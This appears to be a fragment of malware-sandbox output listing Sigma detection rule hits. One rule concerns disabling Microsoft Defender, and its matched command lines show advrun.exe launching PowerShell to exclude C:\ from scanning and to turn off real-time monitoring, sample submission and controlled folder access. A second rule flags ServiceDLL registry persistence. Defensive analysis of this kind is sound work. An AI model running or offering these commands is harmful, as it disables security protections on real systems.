sigma_analysis_results.rule_description: Detects requests to disable Microsoft Defender features using PowerShell commands

match_context.values: @{CommandLine="C:\Windows\TEMP\advrun.exe" /exefilename "cmd.exe" /commandline "/c powershell Add-MpPreference -ExclusionPath C:\; Set-MpPreference -MAPSReporting 0; Set-MpPreference -SubmitSamplesConsent NeverSend; Set-MpPreference -EnableControlledFolderAccess Disabled; Set-MpPreference -DisableRealtimeMonitoring $true;" /WindowState 0 /runas 8 /run; Image=C:\Windows\TEMP\advrun.exe; EventID=1}

@{CommandLine="cmd.exe" /c powershell Add-MpPreference -ExclusionPath C:\; Set-MpPreference -MAPSReporting 0; Set-MpPreference -SubmitSamplesConsent NeverSend; Set-MpPreference -EnableControlledFolderAccess Disabled; Set-MpPreference -DisableRealtimeMonitoring $true;; Image=cmd.exe; EventID=1}

sigma_analysis_results.rule_description:
Detects changes to the "ServiceDLL" value related to a service in the registry.
This is often used as a method of persistence.
